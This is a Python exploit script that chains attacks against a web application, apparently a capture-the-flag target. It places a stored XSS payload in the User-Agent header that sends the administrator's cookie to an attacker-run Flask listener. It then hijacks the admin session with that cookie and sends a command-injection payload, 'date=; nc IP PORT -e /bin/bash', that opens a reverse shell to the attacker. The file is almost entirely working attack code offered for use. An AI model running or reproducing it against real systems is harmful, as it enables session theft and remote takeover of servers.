#!/usr/bin/python3
# Creator: brutuspt

import urllib.parse
import requests
import argparse
import os, sys
import base64
from bs4 import BeautifulSoup


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-tp", "--targetport", help="Target port", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)
parser.add_argument("-wp", "--webport", help="Attacker Web Server Port (Where to serve the payloads)", required=True)

from flask import Flask, request
app = Flask(__name__)

args = parser.parse_args()

s = requests.Session()

def exploit_xss(target_ip, target_port, ip, port):
    # Create the XSS payload
    # POST the payload
    # Wait for the target to trigger it
    # Retrieve the cookie

    payload = "<script>var img = document.createElement('img');img.src = 'http://" + str(ip) + ":" + str(port) + "/?' + document.cookie;</script>"

    #proxies = { "http" : "127.0.0.1:8080" }
    headers = { 
        "Host": str(target_ip) + ":" + str(target_port),
        "User-Agent": str(payload),        
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5"
     }

    
    url = "http://%s:%s/support" % (target_ip, target_port)

    print("[INFO] Let's try to post the XSS payload")

    data = "fname=a&lname=aaa&email=aa%40laal&phone=989&message=%3Cimage+src%2Fonerror%3Dprompt%288%29%3E"
    
    #print(payload)
    
    r = s.post(url, data=data, headers=headers, allow_redirects=True) # proxies=proxies
    #print(r.text)
    
    if "Hacking Attempt Detected" in r.text:
        print("[SUCCESS] We have successfully dropped our XSS payload!")
        print("[INFO] Starting the listener and waiting for the Administrator to trigger it")
        app.run(host='0.0.0.0', port = args.webport, use_reloader=False)

    else:
        print("[ERROR] Something went wrong, we did not manage to drop our XSS payload!")
        sys.exit(1)



@app.route('/')
def grab_cookie():
    isadmin_cookie = request.args.get("is_admin")
    print("\n[SUCCESS] Obtained the Administrator's cookie: " + str(isadmin_cookie))
    # test the admin cookie

    s.cookies.set("is_admin", None)
    s.cookies.set("is_admin", str(isadmin_cookie))

    dashboard_url = "http://%s:%s/dashboard" % (args.target, args.targetport)
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    #proxies = { "http" : "127.0.0.1:8080" }
    
    print("[INFO] Attempting to hijack the Admin's session with the extracted cookie...")
    r = s.get(dashboard_url, headers=headers)

    if "Administrator Dashboard" in r.text:
        print("[SUCCESS] Admin session successfully hijacked!")
        
        # place RCE exploit here
        headers = { 
        "Host": str(args.target) + ":" + str(args.targetport),
        "User-Agent": "MTF",        
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5"
        }

        payload = "date=; nc %s %s -e /bin/bash" % (args.IP, args.port)
        #print(payload)
        
        print("[SUCCESS] Exploit sent")
        print("[SUCCESS] Check your callback")
        r = s.post(dashboard_url, data=payload, headers=headers, allow_redirects=True) # proxies=proxies

        

    else:
        print("[ERROR] You did not managed to hijack the Administrator's session!")
        sys.exit(1)


def main():
    exploit_xss(args.target, args.targetport, args.IP, args.webport)
    

if __name__ == "__main__":
    main()